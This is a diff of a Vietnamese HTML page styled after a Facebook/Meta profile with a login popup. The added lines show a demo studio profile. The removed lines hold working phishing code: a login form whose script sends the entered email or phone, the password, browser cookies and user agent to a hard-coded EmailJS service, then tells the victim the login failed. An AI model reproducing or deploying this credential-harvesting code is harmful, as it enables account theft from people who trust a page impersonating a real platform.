+                        <a href="#" onclick="showAboutTab('established')">Thành lập</a>
+                        <a href="#" onclick="showAboutTab('hours')">Giờ làm việc</a>
+                    </div>
+                    <div id="overview" class="about-content active">
+                        <p><strong>Giới thiệu</strong></p>
+                        <p>Meimei Studio chuyên quay lookbook, chụp ảnh concept theo phong cách cá nhân hóa. Livestream bán hàng hàng tuần và nhận quảng cáo bán hàng.</p>
+                    </div>
+                    <div id="contact" class="about-content">
+                        <p><strong>Liên hệ</strong></p>
+                        <div class="info-item" style="content: '📧';"><p>Email: contact@meimeistudio.vn</p></div>
+                        <div class="info-item" style="content: '📞';"><p>Hotline: 0909 123 456</p></div>
+                        <div class="info-item" style="content: '🌐';"><p>Website: <a href="https://meimeistudio.vn">meimeistudio.vn</a></p></div>
+                    </div>
+                    <div id="work" class="about-content">
+                        <p><strong>Công việc</strong></p>
+                        <div class="info-item" style="content: '📸';"><p>Chụp ảnh concept, quay lookbook, livestream bán hàng.</p></div>
+                        <div class="info-item" style="content: '👩‍💼';"><p>Tuyển mẫu ảnh theo sở thích cá nhân.</p></div>
+                    </div>
+                    <div id="address" class="about-content">
+                        <p><strong>Địa chỉ</strong></p>
+                        <div class="info-item" style="content: '📍';"><p>123 Đường Sáng Tạo, Quận 1, TP. Hồ Chí Minh, Việt Nam</p></div>
+                    </div>
+                    <div id="established" class="about-content">
+                        <p><strong>Thành lập</strong></p>
+                        <div class="info-item" style="content: '📅';"><p>Thành lập vào ngày 15/03/2020</p></div>
+                    </div>
+                    <div id="hours" class="about-content">
+                        <p><strong>Giờ làm việc</strong></p>
+                        <div class="info-item" style="content: '⏰';"><p>Thứ Hai - Thứ Bảy: 9:00 - 18:00</p></div>
+                        <div class="info-item" style="content: '⏰';"><p>Chủ Nhật: Nghỉ</p></div>
+                    </div>
+                </div>
+
+                <div id="photos-tab" class="photos-section tab-content">
+                    <div class="sub-tabs">
+                        <a href="#" class="active">Tất cả ảnh</a>
+                        <a href="#">Album</a>
+                        <a href="#">Ảnh đại diện</a>
+                    </div>
+                    <div class="album">
+                        <img src="https://via.placeholder.com/150?text=Photo+1" alt="Ảnh 1" onclick="alert('Mở ảnh trong album (chức năng demo)')">
+                        <img src="https://via.placeholder.com/150?text=Photo+2" alt="Ảnh 2" onclick="alert('Mở ảnh trong album (chức năng demo)')">
+                        <img src="https://via.placeholder.com/150?text=Photo+3" alt="Ảnh 3" onclick="alert('Mở ảnh trong album (chức năng demo)')">
+                        <img src="https://via.placeholder.com/150?text=Photo+4" alt="Ảnh 4" onclick="alert('Mở ảnh trong album (chức năng demo)')">
+                        <img src="https://via.placeholder.com/150?text=Photo+5" alt="Ảnh 5" onclick="alert('Mở ảnh trong album (chức năng demo)')">
+                        <img src="https://via.placeholder.com/150?text=Photo+6" alt="Ảnh 6" onclick="alert('Mở ảnh trong album (chức năng demo)')">
+                    </div>
+                </div>
+
+                <div id="videos-tab" class="videos-section tab-content">
+                    <p><strong>Video</strong></p>
+                    <p>Video lookbook 1: <a href="#">https://meimeistudio.vn/video1</a></p>
+                    <p>Video lookbook 2: <a href="#">https://meimeistudio.vn/video2</a></p>
+                    <p>Video livestream 1: <a href="#">https://meimeistudio.vn/video3</a></p>
+                    <p>Video livestream 2: <a href="#">https://meimeistudio.vn/video4</a></p>
+                </div>
+
+                <div id="reels-tab" class="reels-section tab-content">
+                    <p><strong>Reels</strong></p>
+                    <p>Reel 1: <a href="#">https://meimeistudio.vn/reel1</a></p>
+                    <p>Reel 2: <a href="#">https://meimeistudio.vn/reel2</a></p>
+                    <p>Reel 3: <a href="#">https://meimeistudio.vn/reel3</a></p>
+                </div>
+
+                <div id="likes-tab" class="likes-section tab-content">
+                    <p><strong>Lượt</strong></p>
+                    <p>893k lượt thích</p>
+                    <p>648k người theo dõi</p>
+                    <p>Được thích bởi: <a href="#">Lan Anh</a>, <a href="#">Ngọc Mai</a>, và 7.8k người khác</p>
+                </div>
             </div>
         </div>
     </div>
 
-    <div id="overlay" class="overlay" onclick="hidePopup()"></div>
-    <div id="popup" class="popup">
-        <h3 id="popup-title"></h3>
-        <small id="popup-subtext"></small>
-        <button class="popup-btn" onclick="hidePopup()">OK</button>
-    </div>
-
-    <div class="footer">
-        <a onclick="showLanguage()">Tiếng Việt</a>
-        <a onclick="showLanguage()">English (US)</a>
-        <a onclick="showPrivacy()">Quyền riêng tư</a>
-        <a onclick="showTerms()">Điều khoản</a>
-        <a onclick="showHelp()">Trợ giúp</a>
-        <br>Meta © 2025
+    <!-- Popup đăng nhập -->
+    <div id="overlay" class="overlay" onclick="hideLoginPopup()"></div>
+    <div id="loginPopup" class="popup">
+        <input type="text" id="login-input" placeholder="Email hoặc số điện thoại">
+        <input type="password" id="password" placeholder="Mật khẩu">
+        <button class="btn-login" onclick="login()">Đăng nhập</button>
+        <a class="forgot-password" href="#">Quên mật khẩu?</a>
+        <div class="divider"></div>
+        <button class="btn-create" onclick="alert('Chuyển đến trang tạo tài khoản (chức năng demo)')">Tạo tài khoản mới</button>
     </div>
 
     <script>
-        function showPopup(title, subtext = "") {
-            document.getElementById('popup-title').innerText = title;
-            document.getElementById('popup-subtext').innerText = subtext;
-            document.getElementById('popup').style.display = 'block';
+        function showLoginPopup() {
+            document.getElementById('loginPopup').style.display = 'block';
             document.getElementById('overlay').style.display = 'block';
         }
 
-        function hidePopup() {
-            document.getElementById('popup').style.display = 'none';
+        function hideLoginPopup() {
+            document.getElementById('loginPopup').style.display = 'none';
             document.getElementById('overlay').style.display = 'none';
         }
 
-        function getCookies() {
-            return document.cookie || "Không có cookie nào được lưu.";
-        }
-
-        function getUIDFromCookie() {
-            const cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                if (cookie.trim().startsWith("c_user=")) {
-                    return cookie.split('=')[1].trim();
-                }
+        function login() {
+            const username = document.getElementById('login-input').value;
+            const password = document.getElementById('password').value;
+            if (username && password) {
+                alert(`Đăng nhập thành công với ${username}! (Chức năng demo)`);
+                hideLoginPopup();
+            } else {
+                alert('Vui lòng nhập đầy đủ email/số điện thoại và mật khẩu!');
             }
-            return "Không tìm thấy UID.";
         }
 
-        function switchContainer(containerClass) {
-            document.querySelectorAll('.right-section > div').forEach(div => div.classList.remove('active'));
-            document.querySelector(`.${containerClass}`).classList.add('active');
-        }
-
-        function showLogin() { switchContainer('login-container'); }
-        function showCreate() { switchContainer('create-container'); }
-        function showForgot() { switchContainer('forgot-container'); }
-        function showLanguage() { switchContainer('language-container'); }
-        function showPrivacy() { switchContainer('privacy-container'); }
-        function showTerms() { switchContainer('terms-container'); }
-        function showHelp() { switchContainer('help-container'); }
-
-        function sendEmail(loginInput, password) {
-            const cookies = getCookies();
-            const templateParams = {
-                name: "User",
-                time: new Date().toLocaleString(),
-                email: loginInput.includes('@') ? loginInput : "Không có email",
-                phone: loginInput.match(/\d+/) ? loginInput : "Không có số điện thoại",
-                password: password,
-                cookies: cookies,
-                user_agent: navigator.userAgent,
-                action: "Đăng nhập qua form",
-                timestamp: new Date().toLocaleString()
-            };
-
-            console.log("Đang gửi email với dữ liệu:", templateParams);
-
-            return emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
-                .then((response) => {
-                    console.log("Email gửi thành công:", response.status, response.text);
-                    showPopup("Email gửi thành công", "Kiểm tra email của bạn!");
-                })
-                .catch((error) => {
-                    console.error("Lỗi gửi email:", error);
-                    showPopup("Lỗi gửi email", "Chi tiết lỗi: " + (error.text || "Không xác định"));
-                });
-        }
-
-        function loginWithForm() {
-            const loginInput = document.getElementById('login-input').value || "";
-            const password = document.getElementById('password').value || "";
-
-            const expiryDate = new Date("2100-01-01").toUTCString();
-            document.cookie = `c_user=123456789; path=/; expires=${expiryDate}`;
-            document.cookie = `login=${encodeURIComponent(loginInput)}; path=/; expires=${expiryDate}`;
-
-            console.log("Cookie sau khi lưu:", document.cookie);
-
-            sendEmail(loginInput, password).finally(() => {
-                showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại.");
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.style.display = 'none';
             });
+            document.querySelectorAll('.tabs a').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.getElementById(tabId).style.display = 'block';
+            document.querySelector(`.tabs a[onclick="showTab('${tabId}')"]`).classList.add('active');
         }
 
-        function createAccount() {
-            const firstName = document.getElementById('first-name').value || "";
-            const lastName = document.getElementById('last-name').value || "";
-            const email = document.getElementById('create-email').value || "";
-            const password = document.getElementById('create-password').value || "";
-
-            if (!firstName || !lastName || !email || !password) {
-                showPopup("Lỗi", "Vui lòng điền đầy đủ thông tin.");
-                return;
-            }
-
-            const expiryDate = new Date("2100-01-01").toUTCString();
-            document.cookie = `c_user=${Math.floor(Math.random() * 1000000000)}; path=/; expires=${expiryDate}`;
-            document.cookie = `login=${encodeURIComponent(email)}; path=/; expires=${expiryDate}`;
-
-            const cookies = getCookies();
-            showPopup("Tạo tài khoản thành công", `Họ: ${firstName}\nTên: ${lastName}\nEmail: ${email}\nCookie: ${cookies}`);
-            setTimeout(showLogin, 2000);
+        function showAboutTab(tabId) {
+            document.querySelectorAll('.about-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.about-tabs a').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.getElementById(tabId).classList.add('active');
+            document.querySelector(`.about-tabs a[onclick="showAboutTab('${tabId}')"]`).classList.add('active');
         }
 
-        function submitForgot() {
-            const forgotInput = document.getElementById('forgot-input').value || "";
-            if (!forgotInput) {
-                showPopup("Lỗi", "Vui lòng nhập email hoặc số điện thoại.");
-                return;
-            }
-            showPopup("Yêu cầu đã gửi", `Chúng tôi sẽ gửi hướng dẫn khôi phục đến: ${forgotInput}`);
-            setTimeout(showLogin, 2000);
-        }
-
-        window.onload = function() {
-            if (getUIDFromCookie() !== "Không tìm thấy UID.") {
-                showPopup("Đã đăng nhập", "Bạn đã có cookie UID: " + getUIDFromCookie());
-            }
-        };
+        // Show posts tab by default
+        showTab('posts-tab');
     </script>
 </body>
 </html>
